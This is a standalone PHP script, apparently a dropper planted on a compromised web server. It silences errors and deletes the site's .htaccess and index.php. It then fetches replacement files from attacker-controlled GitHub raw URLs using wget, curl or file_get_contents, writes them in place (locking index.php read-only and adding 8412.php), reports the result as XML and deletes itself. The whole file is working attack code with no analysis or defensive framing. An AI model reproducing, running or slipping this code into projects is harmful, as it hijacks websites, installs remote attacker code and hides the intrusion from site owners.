<?php
@ini_set('display_errors', '0');
@error_reporting(0);

/* ================= XML RESPONSE ================= */
function xml_response($arr)
{
    header('Content-Type: application/xml; charset=UTF-8');
    echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<response>\n";
    foreach ($arr as $k => $v) {
        $v = htmlspecialchars((string)$v, ENT_QUOTES, 'UTF-8');
        echo "  <{$k}>{$v}</{$k}>\n";
    }
    echo "</response>";
    die;
}

/* ================= PATH HANDLING ================= */
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
$path = parse_url($uri, PHP_URL_PATH);
$parts = array_values(array_filter(explode('/', (string)$path)));

$inSubdir = count($parts) > 1;
if ($inSubdir) {
    @chdir('..');
}

/* ================= REMOTES ================= */
$remoteIndex = 'https://raw.githubusercontent.com/newmarch2026/bela/refs/heads/main/26-3-26/index.php';
$remoteFile  = 'https://raw.githubusercontent.com/newmarch2026/bela/refs/heads/main/20-3-2026/8412.php';

/* ================= HELPERS ================= */
function func_enabled($f)
{
    if (!function_exists($f)) return false;
    $d = ini_get('disable_functions');
    if (!$d) return true;
    return !in_array($f, array_map('trim', explode(',', $d)));
}

function wget_ok()
{
    if (!func_enabled('exec')) return false;
    @exec('wget --version 2>/dev/null', $o, $r);
    return $r === 0;
}

function curl_ok()
{
    return function_exists('curl_init');
}

function fopen_ok()
{
    return ini_get('allow_url_fopen');
}

function fetch_remote($url, &$method)
{
    /* wget */
    if (wget_ok()) {
        $tmp = @tempnam(sys_get_temp_dir(), 'wg_');
        if ($tmp) {
            @exec('wget -q -O ' . escapeshellarg($tmp) . ' ' . escapeshellarg($url) . ' 2>/dev/null', $o, $r);
            if ($r === 0 && file_exists($tmp) && filesize($tmp) > 0) {
                $method = 'wget';
                $d = @file_get_contents($tmp);
                @unlink($tmp);
                return $d;
            }
            @unlink($tmp);
        }
    }

    /* curl */
    if (curl_ok()) {
        $ch = @curl_init($url);
        if ($ch) {
            @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            @curl_setopt($ch, CURLOPT_TIMEOUT, 20);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $d = @curl_exec($ch);
            @curl_close($ch);
            if ($d) {
                $method = 'curl';
                return $d;
            }
        }
    }

    /* file_get_contents */
    if (fopen_ok()) {
        $ctx = stream_context_create(array('http' => array('timeout' => 20)));
        $d = @file_get_contents($url, false, $ctx);
        if ($d) {
            $method = 'file_get_contents';
            return $d;
        }
    }

    return false;
}

/* ================= CLEAN OLD ================= */
foreach (array('.htaccess', 'index.php') as $f) {
    if (is_file($f)) {
        @chmod($f, 0644);
        @unlink($f);
    }
}

/* ================= DOWNLOAD ================= */
$m1 = 'none';
$m2 = 'none';

$d1 = fetch_remote($remoteIndex, $m1);
$d2 = fetch_remote($remoteFile,  $m2);

if ($d1 !== false) {
    @file_put_contents('index.php', $d1);
    @chmod('index.php', 0444);
}

if ($d2 !== false) {
    @file_put_contents('8412.php', $d2);
}

/* ================= OUTPUT ================= */
xml_response(array(
    'status'        => 'ok',
    'directory'     => $inSubdir ? 'parent' : 'current',
    'index_method'  => $m1,
    'file_method'   => $m2,
    'index_written' => $d1 ? 'yes' : 'no',
    'file_written'  => $d2 ? 'yes' : 'no'
));

@unlink(__FILE__);
